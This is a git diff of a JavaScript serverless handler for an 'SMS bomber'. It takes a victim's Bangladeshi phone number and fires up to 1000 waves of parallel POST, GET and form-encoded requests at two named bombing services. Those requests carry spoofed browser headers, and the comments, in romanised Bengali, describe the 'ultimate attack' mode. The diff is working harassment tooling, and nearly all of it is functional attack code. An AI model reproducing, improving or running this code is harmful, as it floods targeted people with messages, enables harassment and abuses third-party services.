@@ -10,62 +10,88 @@ export default async function handler(req, res) {
   if (cleanNumber.startsWith('88')) cleanNumber = cleanNumber.substring(2);
   if (cleanNumber.length > 11) cleanNumber = cleanNumber.substring(0, 11);
 
-  // 2. Target Endpoints (Directly hitting the root and common API paths)
   const targetLinks = [
     'https://nuke-sms-bomber.pages.dev/',
-    'https://shadowx-sms-bomber.onrender.com/',
-    'https://nuke-sms-bomber.pages.dev/api/attack',
-    'https://shadowx-sms-bomber.onrender.com/api/send'
+    'https://shadowx-sms-bomber.onrender.com/'
   ];
 
   const runAttack = async () => {
-    const totalWaves = isUltimate ? 100 : amount; 
-    const delay = isUltimate ? 400 : 1500; 
+    // Ultimate mode e 1000+ attack simulation
+    const totalWaves = isUltimate ? 1000 : amount; 
+    const delay = isUltimate ? 300 : 1000; 
 
     for (let i = 0; i < totalWaves; i++) {
-      const attackPromises = targetLinks.map(async (link) => {
-        try {
-          // 3. Extreme Header Spoofing
-          // Amra ekhane ekta real browser er pura identity pathacchi
-          const response = await fetch(link, {
-            method: 'POST',
-            headers: { 
-              'Content-Type': 'application/json',
-              'Accept': 'application/json, text/plain, */*',
-              'Accept-Language': 'en-US,en;q=0.9',
-              'Cache-Control': 'no-cache',
-              'Connection': 'keep-alive',
-              'Origin': link,
-              'Referer': link,
-              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
-              'X-Requested-With': 'XMLHttpRequest',
-            },
-            // 4. Massive Payload (All possible parameters)
-            body: JSON.stringify({
-              number: cleanNumber,
-              phone: cleanNumber,
-              target: cleanNumber,
-              mobile: cleanNumber,
-              amount: 1,
-              count: 1,
-              qty: 1,
-              country: "BD",
-              service: "whatsapp",
-              msg: "Ultimate Attack",
-              auth: "true",
-              token: "secret_token_" + Math.random().toString(36).substring(7),
-              is_active: true,
-              status: "active",
-              method: "sms"
-            }),
-            mode: 'cors'
-          });
+      // Protibar loop e amra multiple methods try korbo
+      const attackPromises = targetLinks.map(async (baseUrl) => {
+        
+        // --- METHOD 1: POST with Massive Payload (JSON) ---
+        const postPayload = async () => {
+          try {
+            await fetch(baseUrl, {
+              method: 'POST',
+              headers: { 
+                'Content-Type': 'application/json',
+                'Accept': 'application/json, text/plain, */*',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+                'X-Requested-With': 'XMLHttpRequest',
+                'Origin': baseUrl,
+                'Referer': baseUrl,
+              },
+              body: JSON.stringify({
+                number: cleanNumber,
+                phone: cleanNumber,
+                target: cleanNumber,
+                amount: 1,
+                count: 1,
+                country: "BD",
+                service: "whatsapp",
+                msg: "Ultimate Attack",
+                auth: "true",
+                token: Math.random().toString(36).substring(7),
+                is_active: true
+              }),
+              mode: 'no-cors'
+            });
+          } catch (e) {}
+        };
 
-          console.log(`[Wave ${i}] Hit: ${link} | Status: ${response.status}`);
+        // --- METHOD 2: GET with Query Parameters (URL Injection) ---
+        const getPayload = async () => {
+          const urlWithParams = `${baseUrl}?number=${cleanNumber}&amount=1&country=BD&service=whatsapp&phone=${cleanNumber}&target=${cleanNumber}`;
+          try {
+            await fetch(urlWithParams, {
+              method: 'GET',
+              mode: 'no-cors',
+              headers: {
+                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
+              }
+            });
+          } catch (e) {}
+        };
 
-        } catch (err) {
-          console.error(`[Wave ${i}] Error: ${err.message}`);
-        }
+        // --- METHOD 3: Form Data Simulation (X-WWW-FORM-URLENCODED) ---
+        const formDataPayload = async () => {
+          try {
+            const formData = new URLSearchParams();
+            formData.append('number', cleanNumber);
+            formData.append('amount', '1');
+            formData.append('country', 'BD');
+
+            await fetch(baseUrl, {
+              method: 'POST',
+              headers: { 
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+              },
+              body: formData.toString(),
+              mode: 'no-cors'
+            });
+          } catch (e) {}
+        };
+
+        // Ekhon amra sob method eksathe execute korbo (Parallel Attack)
+        return Promise.all([postPayload(), getPayload(), formDataPayload()]);
+
       });
 
       await Promise.all(attackPromises);
@@ -77,6 +103,6 @@ export default async function handler(req, res) {
 
   return res.status(200).json({ 
     success: true, 
-    message: isUltimate ? "ULTIMATE ATTACK STARTED! 🚀" : "ATTACK STARTED! 🔥" 
+    message: isUltimate ? "ULTIMATE ATTACK INITIATED! 🚀" : "ATTACK STARTED! 🔥" 
   });
-}
+                }
